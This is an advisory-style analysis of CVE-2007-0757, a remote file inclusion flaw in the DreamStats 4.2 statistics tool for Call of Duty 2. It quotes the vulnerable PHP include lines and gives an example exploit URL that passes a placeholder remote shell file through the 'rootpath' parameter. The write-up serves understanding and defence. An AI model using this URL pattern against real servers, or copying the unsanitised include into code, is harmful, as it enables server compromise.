Based on the provided information, here's an analysis of CVE-2007-0757:

**Root cause of vulnerability:**
The vulnerability is caused by a flaw in the `index.php` file of DreamStats version 4.2, where the `rootpath` parameter, obtained from user input via the GET method, is not properly sanitized before being used in an `include()` function.

**Weaknesses/vulnerabilities present:**
- **Remote File Inclusion (RFI):** The primary vulnerability is RFI. The application directly includes a file specified by the user-controlled `rootpath` parameter, making it vulnerable to including arbitrary remote files.

**Impact of exploitation:**
- **Arbitrary Code Execution:** An attacker can include a malicious file from a remote server, which would execute within the context of the vulnerable application. This could lead to complete compromise of the server hosting the application.
- **Data Theft:** Access to sensitive data could be gained.
- **Website Defacement:** The attacker could deface the website.

**Attack vectors:**
- **HTTP GET Request:** The vulnerability is triggered through a crafted HTTP GET request to the `index.php` script.
- **`rootpath` parameter:** The malicious file path is provided through the `rootpath` parameter in the URL.

**Required attacker capabilities/position:**
- **Network Access:** The attacker needs to have network access to the server hosting the vulnerable DreamStats application.
- **Knowledge of Vulnerable Parameter:** The attacker must know that the `rootpath` parameter is vulnerable to remote file inclusion.
- **Malicious File Hosting:** The attacker needs to host a malicious PHP file on a server they control.

**Technical Details:**

- The vulnerable code snippet is:
```php
@include($rootpath . 'includes/ip_vers.php');
@include($rootpath . 'includes/core.php');
```
- An example of an exploit URL is: `http://www.Site.com/PaTh/upload/index.php?rootpath=[Shell]` where `[Shell]` would be replaced with the URL to a malicious php file.

**Additional Notes**

- The vulnerability is present in DreamStats version 4.2. Versions 4.1 and below were not downloadable and version 5.0 is not vulnerable
- The application is a statistics system for the Call of Duty 2 game.
